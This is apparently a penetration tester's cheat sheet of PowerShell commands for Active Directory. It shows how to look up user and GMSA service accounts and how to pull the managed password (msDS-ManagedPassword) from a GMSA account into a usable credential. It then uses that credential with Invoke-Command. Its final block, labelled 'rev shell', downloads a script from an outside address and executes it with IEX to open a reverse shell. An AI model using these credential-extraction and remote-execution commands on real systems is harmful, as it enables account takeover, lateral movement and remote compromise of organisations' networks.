# active directory

## get user account
```powershell
Get-AdUser AccountUsername
```

## get GMSA service account properties
```powershell
Get-AdServiceAccount AccountUsername -properties *
```

### get GMSA password and run commands
```powershell
# get password
$gmsa = Get-AdServiceAccount AccountUsername -properties msDS-ManagedPassword
$mp = $gmsa.'msDS-ManagedPassword'
# get secure string
$secpwd = (ConvertFrom-AdManagedPasswordBlob $mp).SecureCurrentPassword
$cred = New-Object System.Management.Automation.PSCredential('AccountUsername', $secpwd)
# test command
Invoke-Command -Computer 127.0.0.1 -Credential $cred -ScriptBlock { whoami }
# rev shell
Invoke-Command -Computer 127.0.0.1 -Credential $cred -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://192.168.1.69/rev.ps1') }
```
